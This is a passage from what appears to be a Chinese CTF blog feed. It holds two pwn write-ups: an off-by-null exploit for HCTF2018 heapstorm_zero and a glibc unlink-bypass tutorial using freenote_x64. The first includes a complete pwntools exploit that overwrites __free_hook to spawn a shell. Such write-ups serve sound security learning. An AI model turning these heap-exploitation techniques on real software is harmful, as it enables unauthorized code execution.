class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-15.png" class="lozad"><br>最后触发 free , 调用 one_gadget ，拿到 shell.</p><p>完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">"easy_heap"</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">bin = ELF(path)</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64((p.recvline()[:<span class="number">-1</span>]).ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 tcache 分配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配 unsorted bin</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次让 chunk 回到 tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剩下的 tcache 里面的 bin 消耗掉</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">8</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 chunk 8, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0xe42ee</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 free_hook</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>参考<br><a href="https://www.cnblogs.com/hac425/p/9993716.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9993716.html</a><br><a href="https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py</a><br><a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。&lt;/p&gt;
&lt;p&gt;题目
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://nocbtm.github.io/2020/02/27/unlink/"/>
    <id>https://nocbtm.github.io/2020/02/27/unlink/</id>
    <published>2020-02-27T06:38:52.000Z</published>
    <updated>2020-04-08T14:04:21.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;<br>smallbin的数据结构：prev_size,size,fd,bk;<br>因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；<br>主要检查fd,bk等指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></p><p>在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure><p>unlink操作的简要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)</span></span><br><span class="line">&#123;</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span>(FD-&gt;bk != P || BK-&gt;fd !=p)</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted d..."</span>, P);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件：</p><ol><li>有一个指向heap内的指针；</li><li>存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)；</li><li>可以对这个指针进行多次写入；</li><li>然后我们想办法修改p的fd和p的bk分别为:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">0x18</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">0x10</span>; <span class="comment">//bk</span></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">12</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">8</span>; <span class="comment">//bk</span></span><br></pre></td></tr></table></figure><p>这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p = &amp;p - <span class="number">0x18</span>；</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p = &amp;p - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们以JarvisOJ中的freenote_x64来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；<br>这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；<br>主要漏洞在delete note里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_list-&gt;number &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No posts yet."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Post number: "</span>);</span><br><span class="line">    i = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt; chunk_list-&gt;sum )        <span class="comment">// 未检查inuse位，double_free</span></span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">      chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(chunk_list-&gt;block[i].ptr);           <span class="comment">// 指针未清空</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余；</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br>在heap基地址偏移0x30的地方有我们需要的&amp;p:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000001 0x0000000000000004</span><br><span class="line">0x603030:&amp;p0x0000000000604830 p 0x0000000000000001</span><br><span class="line">0x603040:0x0000000000000002 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>有了&amp;p之后我们就可以构造chunk，然后unlink了；<br>unlink之后的&amp;p,此时p=&amp;p-0x18:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603030:0x0000000000603018 p 0x0000000000000001 //p=&amp;p-0x18</span><br><span class="line">0x603040:0x0000000000000008 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了；</p><h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>伪造的如下三个堆块结构 ，注意chunk前后的size一定要相对应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x17b8820</span><br><span class="line">0x17b8820:0x00000000000000000x0000000000000191</span><br><span class="line">0x17b8830:0x00000000000000900x0000000000000081</span><br><span class="line">0x17b8840:0x00000000017b70180x00000000017b7020</span><br><span class="line">0x17b8850:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8860:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8870:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8880:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8890:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x17b88c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8900:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8910:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8920:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8930:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8940:0x00000000000000900x0000000000000121</span><br><span class="line">0x17b8950:0x32323232323232320x00007f61721feb78</span><br><span class="line">0x17b8960:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8970:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8980:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8990:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x17b89c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x17b89e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b89f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a00:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a10:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a20:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a30:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a40:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>free(1)之后，堆块的结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x11dd820</span><br><span class="line">0x11dd820:0x00000000000000000x0000000000000191</span><br><span class="line">0x11dd830:0x00000000000000900x0000000000000111</span><br><span class="line">0x11dd840:0x00007fc6bdb86b780x00007fc6bdb86b78</span><br><span class="line">0x11dd850:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd860:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd870:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd880:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd890:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x11dd8c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd900:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd910:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd920:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd930:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd940:0x00000000000001100x0000000000000120</span><br><span class="line">0x11dd950:0x32323232323232320x00007fc6bdb86b78</span><br><span class="line">0x11dd960:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd970:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd980:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd990:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x11dd9c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x11dd9e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dd9f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda00:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda10:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda20:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda30:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda40:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>而目标地址已经被修改为 p=&amp;p-0x18<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x11dc000</span><br><span class="line">0x11dc000:0x00000000000000000x0000000000001821</span><br><span class="line">0x11dc010:0x00000000000001000x0000000000000000</span><br><span class="line">0x11dc020:0x00000000000000010x0000000000000120</span><br><span class="line">0x11dc030:0x00000000011dc0180x0000000000000000  //p=&amp;p-0x18</span><br><span class="line">0x11dc040:0x00000000000000000x00000000011dd8c0</span><br><span class="line">0x11dc050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc060:0x00000000011dd9500x0000000000000000</span><br><span class="line">0x11dc070:0x00000000000000000x00000000011dd9e0</span><br><span class="line">0x11dc080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc090:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0d0:0x00000000000000000x0000000000000000</span><br><span 